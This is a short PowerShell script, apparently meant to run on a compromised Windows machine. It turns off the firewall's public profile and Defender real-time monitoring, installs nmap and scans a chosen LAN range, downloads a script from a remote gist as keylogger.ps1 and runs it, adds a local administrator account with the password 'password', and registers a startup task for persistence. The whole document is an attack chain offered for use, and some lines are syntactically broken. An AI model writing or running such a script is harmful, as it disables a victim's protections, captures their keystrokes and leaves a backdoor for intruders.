whoami
hostname
$nethost = Read-Host -Prompt "Enter the network address of your LAN (ex. 192.168.201)
$firstip = Read-Host -Prompt "Enter the first host ID you want to scan (ex. for 192.168.201.50, enter 50)"
$lastip = Read-Host -Prompt "Enter the last host ID you want to scan"
Set-NetFirewallProfile -Profile Public -Enabled False
Set-MpPreference -DisableRealTimeMonitoring $True
Invoke-WebRequest https://nmap.org/dist/nmap-7.93-setup.exe -OutFile "C:\Users\setup"
cd C:\Users\setup
cmd.exe /c nmap-7.93-setup.exe
cmd.exe /c nmap -T4 -A -v ($nethost + $firstip + "-" + $lastip) -oN netscan
Invoke-WebRequest https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt -OutFile C:\Users\setup\keylogger.ps1
./keylogger.ps1
New-LocalUser -Name "newuser" -AccountNeverExpires -Password "password"
Add-LocalGroupMember -Group "Administrators" -Member "newuser"
$trigger = New-JobTrigger -AtStartup
Register-ScheduledTask -FilePath C:\Users\setup\startupscript.ps1 -Trigger $trigger